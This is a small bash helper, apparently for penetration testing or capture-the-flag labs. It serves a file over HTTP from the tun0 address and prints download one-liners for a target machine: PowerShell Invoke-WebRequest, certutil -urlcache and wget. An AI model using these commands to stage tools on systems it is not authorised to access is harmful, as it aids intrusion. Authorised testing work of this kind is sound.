#!/bin/bash


if [ "$#" -ne 1 ] || [ "$1" == "--help" ];
then
    echo "usage";
    echo "HttpShare.sh FILE";
    exit;
fi 

FILE=$1;

myip=$(ifconfig | grep -A1 tun0 | grep -i inet | awk '{print $2}');

echo ""
echo Invoke-WebRequest -Uri \"http://$myip/$FILE\" -OutFile \"$FILE\" 
echo ""

echo ""
echo certutil.exe -urlcache -f http://$myip/$FILE $FILE 
echo ""

echo ""
echo wget http://$myip/$FILE
echo ""

python -m http.server 80
